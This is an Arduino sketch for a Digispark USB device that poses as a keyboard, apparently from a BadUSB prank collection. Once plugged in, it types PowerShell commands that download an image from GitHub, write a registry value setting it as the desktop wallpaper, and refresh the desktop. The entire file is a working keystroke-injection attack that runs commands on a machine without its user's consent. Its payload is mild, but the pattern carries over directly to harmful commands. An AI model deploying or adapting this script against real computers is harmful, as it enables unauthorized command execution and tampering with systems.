#define kbd_es_es
#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(67,KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Invoke-WebRequest -Uri 'https://github.com/r4mos/Digispark-Duckduino/raw/master/Change_Wallpaper/wallpaper.jpg' -OutFile $env:TEMP/61772051-4de4-4c99-8842-6ec7db0a9535.jpg");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("reg add 'HKEY_CURRENT_USER\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d $env:TEMP/61772051-4de4-4c99-8842-6ec7db0a9535.jpg /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
}

void loop() {

}
